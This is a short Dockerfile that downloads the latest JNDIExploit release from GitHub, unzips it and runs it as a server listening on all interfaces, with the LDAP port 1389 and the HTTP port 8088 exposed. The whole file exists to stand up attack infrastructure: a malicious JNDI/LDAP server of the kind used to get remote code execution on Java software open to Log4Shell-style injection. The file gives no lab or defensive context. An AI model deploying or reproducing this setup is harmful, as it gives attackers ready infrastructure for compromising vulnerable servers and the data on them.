FROM openjdk:11
EXPOSE 8088
# RUN apk add wget curl unzip -y
WORKDIR /app
RUN wget $(curl -s https://api.github.com/repos/feihong-cs/JNDIExploit/releases/latest | grep "download.*\.zip" | cut -d'"' -f4)
RUN unzip JNDIExploit.*.zip && rm *.zip
EXPOSE 1389
CMD ["bash", "-c", "java -jar /app/JNDIExploit-*.jar -i 0.0.0.0 -p 8088"]
